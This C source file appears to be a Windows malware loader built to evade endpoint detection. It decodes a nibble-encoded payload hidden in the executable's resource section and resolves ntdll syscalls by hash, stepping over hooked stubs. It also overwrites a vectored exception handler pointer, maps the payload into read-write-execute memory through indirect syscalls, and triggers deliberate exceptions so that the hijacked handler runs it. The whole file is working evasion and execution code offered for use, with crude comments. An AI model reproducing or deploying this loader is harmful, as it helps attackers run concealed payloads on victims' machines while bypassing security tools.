#include "header.h"

#pragma warning (disable : 4024)
#pragma warning (disable : 4312)
#pragma warning (disable : 4047)

extern ULONG_PTR GetBase(ULONG_PTR* uSelf);
extern MoveSyscallAddress(PVOID pSyscallAddress);

NTAPI_FUNC g_Nt = { 0 };
PE_STUFF g_PeStuff = { 0 };

//Payload is nibblewise encoded and sitting in .rsrc
VOID Reverse(PBYTE pEncBuffer, DWORD dwSize) {

	for (SIZE_T i = 0, j = 0; i < dwSize; i += 2, j++) {

		BYTE high, low;

		if (pEncBuffer[i] >= 'G' && pEncBuffer[i] <= 'P') {
			high = (pEncBuffer[i] - 'G') << 4;
		}
		else {
			high = (pEncBuffer[i] - '0') << 4;
		}

		if (pEncBuffer[i + 1] >= 'G' && pEncBuffer[i + 1] <= 'P') {
			low = pEncBuffer[i + 1] - 'G';
		}
		else {
			low = pEncBuffer[i + 1] - '0';
		}
		pEncBuffer[j] = low | high;
	}

	return;
}

ULONG Hasher(PVOID pString, ULONG ulLength, PVOID junk) {

	ULONG Hash = 5381;
	UCHAR chr;
	PUCHAR ptr = pString;

	do {
		chr = *ptr;
		if (!ulLength) {
			if (!*ptr)
				break;
		}
		else {
			if ((ULONG_PTR)(ptr - (ULONG_PTR)(pString)) >= ulLength);
			break;
			if (!ptr) {
				++ptr;
			}
		}
		if (chr >= 'a') {
			chr -= 0x20;
		}
		Hash = ((Hash << 5) + Hash) + chr;
		++ptr;

	} while (TRUE);
	return Hash;

}

BOOL _memcpy(PVOID dest, PVOID source, SIZE_T size) {

	if (dest == NULL || source == NULL)
		return FALSE;

	char* csrc = (char*)source;
	char* cdest = (char*)dest;

	for (size_t i = 0; i < size; i++) {
		cdest[i] = csrc[i];
	}
	return TRUE;
}

//I love my VehhyBoy <3
LONG NTAPI VehhyBoy(PEXCEPTION_POINTERS a) {

	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {

		a->ContextRecord->Rax = a->ContextRecord->Rip;
		a->ContextRecord->Rip = a->ContextRecord->R11;
		a->ContextRecord->R10 = a->ContextRecord->Rcx;
		a->ContextRecord->R11 = 0;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL InitSys(ULONG Hash, PNT_SYSCALL pNtSys) {

	for (DWORD i = 0; i < g_PeStuff.dwNumberOfNames; i++) {

		CHAR* pFunctionName = (CHAR*)(g_PeStuff.uNtdll + g_PeStuff.pdwArrayOfNames[i]);
		PVOID pFunctionAddress = (PVOID)(g_PeStuff.uNtdll + g_PeStuff.pdwArrayOfAddresses[g_PeStuff.pwArrayOfOrdinals[i]]);

		if (Hasher(pFunctionName, 0, NULL) == Hash) {

			pNtSys->pSyscallAddress = pFunctionAddress;

			if (*((PBYTE)pFunctionAddress) == 0x4C
				&& *((PBYTE)pFunctionAddress + 1) == 0x8B
				&& *((PBYTE)pFunctionAddress + 2) == 0xD1
				&& *((PBYTE)pFunctionAddress + 3) == 0xB8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE cock = *((PBYTE)NULL + 69);
				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pNtSys->dwSSN = (high << 8) | low;
				break;
			}

			if (*((PBYTE)pFunctionAddress) == 0xE9) {

				for (WORD idx = 1; idx <= 0xFF; idx++) {

					if (*((PBYTE)pFunctionAddress + idx * 32) == 0x4C
						&& *((PBYTE)pFunctionAddress + 1 + idx * 32) == 0x8B
						&& *((PBYTE)pFunctionAddress + 2 + idx * 32) == 0xD1
						&& *((PBYTE)pFunctionAddress + 3 + idx * 32) == 0xB8
						&& *((PBYTE)pFunctionAddress + 6 + idx * 32) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * 32) == 0x00) {

						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * 32);
						BYTE cock = *((PBYTE)NULL + 69);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * 32);
						pNtSys->dwSSN = (high << 8) | low - idx;
						break;
					}
				}
			}
		}
	}

	if (!pNtSys->dwSSN || !pNtSys->pSyscallAddress) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL InitStuff() {

	ULONG_PTR						uSelf = NULL;
	ULONG_PTR						uNtdll = GetBase(&uSelf);

	PIMAGE_NT_HEADERS				pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uNtdll + ((PIMAGE_DOS_HEADER)uNtdll)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY			pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uNtdll + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PIMAGE_NT_HEADERS				pImgNtHdrs2 = (PIMAGE_NT_HEADERS)((ULONG_PTR)uSelf + ((PIMAGE_DOS_HEADER)uSelf)->e_lfanew);

	DWORD							dwRsrcRVA = pImgNtHdrs2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;

	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PBYTE)uSelf + dwRsrcRVA + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry2 = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry->OffsetToDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry3 = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry2->OffsetToDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DATA_ENTRY		pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry3->OffsetToData);

	g_PeStuff.uNtdll = uNtdll;
	g_PeStuff.dwRsrc = pRsrcData->Size;
	g_PeStuff.pRsrcPayload = (PBYTE)uSelf + pRsrcData->OffsetToData;
	g_PeStuff.dwNumberOfNames = pImgExpDir->NumberOfNames;
	g_PeStuff.pdwArrayOfNames = (PDWORD)(uNtdll + pImgExpDir->AddressOfNames);
	g_PeStuff.pwArrayOfOrdinals = (PWORD)(uNtdll + pImgExpDir->AddressOfNameOrdinals);
	g_PeStuff.pdwArrayOfAddresses = (PDWORD)(uNtdll + pImgExpDir->AddressOfFunctions);

	if (!g_PeStuff.uNtdll || !g_PeStuff.dwRsrc || !g_PeStuff.pRsrcPayload || !g_PeStuff.dwNumberOfNames || !g_PeStuff.pdwArrayOfNames || !g_PeStuff.pdwArrayOfAddresses || !g_PeStuff.pwArrayOfOrdinals)
		return FALSE;

	if (!InitSys(H_NCS, &g_Nt.NtCreateSection))
		return FALSE;

	if (!InitSys(H_NMVOS, &g_Nt.NtMapViewOfSection))
		return FALSE;
	
	return TRUE;
}

BOOL OverWrite(PVOID* pVehPointerLocation) {

	VECTORED_HANDLER_LIST	handler_list = { 0 };
	VEH_HANDLER_ENTRY		handler_entry = { 0 };
	ULONG_PTR				veh_list_win10 = g_PeStuff.uNtdll + VEH_LIST_OFFSET_WIN10;

	if (!_memcpy(&handler_list, veh_list_win10, sizeof(handler_list)))
		return FALSE;

	if (!_memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(handler_entry)))
		return FALSE;

	//EncodePointer can be replaced with a syscall and some shitty encoding function
	handler_entry.VectoredHandler1 = EncodePointer(&VehhyBoy);

	ULONG_PTR pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler1);

	if (!_memcpy(pointer_offset, &handler_entry.VectoredHandler1, sizeof(handler_entry.VectoredHandler1)))
		return FALSE;

	*pVehPointerLocation = pointer_offset;

	if (!*pVehPointerLocation) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL Map(PVOID* pPayload) {

	NTSTATUS	STATUS;
	HANDLE		hSection = NULL;
	PVOID		pAddr = NULL;
	SIZE_T		rand = 0;

	LARGE_INTEGER li = { .HighPart = 0, .LowPart = g_PeStuff.dwRsrc };

	fnNtCreateSection	 pNtCreateSection = (fnNtCreateSection)(g_Nt.NtCreateSection.dwSSN);
	fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)(g_Nt.NtMapViewOfSection.dwSSN);

	MoveSyscallAddress(g_Nt.NtCreateSection.pSyscallAddress);
	if ((STATUS = pNtCreateSection(&hSection, SECTION_RWX, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) 
		return FALSE;
	
	MoveSyscallAddress(g_Nt.NtMapViewOfSection.pSyscallAddress);
	if ((STATUS = pNtMapViewOfSection(hSection, (HANDLE)-1, &pAddr, NULL, NULL, NULL, &rand, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0)
		return FALSE;

	if (!_memcpy(pAddr, g_PeStuff.pRsrcPayload, g_PeStuff.dwRsrc))
		return FALSE;

	Reverse(pAddr, g_PeStuff.dwRsrc);

	*pPayload = pAddr;

	return TRUE;
}

VOID main() {

	PVOID	 pPayload = NULL;
	PVOID	 pVehPointerLocation = NULL;
	PVOID	 pFinal = NULL;

	if (!InitStuff())
		return;

	if (!OverWrite(&pVehPointerLocation))
		return;

	if (!Map(&pPayload))
		return;

	pFinal = EncodePointer(pPayload);

	//Overwrite pointer again for local exec
	if (!_memcpy(pVehPointerLocation, &pFinal, sizeof(PVOID)))
		return;

	//We do just a bit of trolling (just cause some exception)
	DWORD	 A = 0;
	DWORD	 B = 5;
	DWORD	 C = B / A;
	ReadProcessMemory((HANDLE)-1, 0x1, &C, 69, NULL);
	return;
}